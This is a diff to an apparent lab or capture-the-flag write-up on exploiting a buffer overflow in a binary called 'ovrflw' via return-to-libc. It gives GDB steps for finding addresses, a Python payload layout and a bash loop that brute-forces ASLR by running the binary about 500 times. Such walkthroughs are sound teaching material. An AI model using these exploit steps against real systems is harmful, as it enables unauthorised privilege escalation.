@@ -63,19 +63,17 @@ The command will start at the system address and look for the pattern "/bin/sh" 
 
 The address of "/bin/sh" was found to be `0xb777ebac`.
 
-The exit address can be found using the following command:
+The exit address can be found using the following command in GDB:
 
-``` gdb ./ovrflw 
-b main
-r
-p exit 
-```
+`p exit `
+
 This gives the exit address 0xb764f260
 
 The exploit will be 112\*characters + system address + exit address + "/bin/sh" address.  The following python exploit code contains the aforementioned structure.  Note that the struct library is used to put the data in little endian format, denoted by the "<I".  For instance, this would convert the exit address 0xb764f260 to 0x60f264b7.
 
 
 #### Python Exploit Code
+Save the code into a file named exploit.py and make it executable using `chmod +x`.
 ```#!/usr/bin/python
 
 import struct
@@ -89,5 +87,16 @@ payload += system_mem
 payload += exit_mem
 payload += binsh_mem
 
-print(payload)```
+print(payload)
+```
+
+### Bypassing Address Space Layout Randomisation (ASLR)
+
+ASLR randomises the position of the executable and the libraries it uses in Random Access Memory (RAM), in an effort to secure against buffer overflows.  
+
+This can be bypassed by executing a program a number of times, until the same address values are reused.  The following Linux bash command will run the `ovrflw` program and give the python script as the input.  The program will be executed 512 times, in an effort to trigger the buffer overlow using the addresses taken from within GDB:
+
+```for i in `seq 0 500`; do /usr/local/bin/ovrflw `python exploit.py`;done```
+
+
 
